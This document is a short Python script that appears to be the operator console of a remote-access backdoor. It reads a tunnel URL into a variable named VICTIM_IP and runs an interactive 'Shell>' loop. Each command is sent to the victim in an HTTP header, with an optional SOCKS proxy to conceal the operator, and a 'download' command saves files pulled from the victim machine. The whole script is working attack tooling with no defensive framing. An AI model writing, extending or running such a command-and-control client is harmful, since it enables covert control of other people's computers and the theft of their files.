from urllib import request, parse
import requests



VICTIM_IP = "https://" + input("[*] Tunnel URL Here:/> ")


def communication(command):
    proxies = {
        "http": ""#add socks proxy here like so, socks5://{ip}:9050
    }
    headers = {
        "command": command
    }
    response = requests.get(VICTIM_IP, headers=headers, proxies=proxies)
    if command[:8] == 'download':
        print('[_Downloading... ' + command[9:])
        f = open(command[9:], 'wb')
        f.write(response.content)
        f.close()
    else:
        print(response.text)


def Shell():
    while True:
        command = input("Shell> ")
        if command == "quit":
            break
        else:
            communication(command)


Shell()                                    
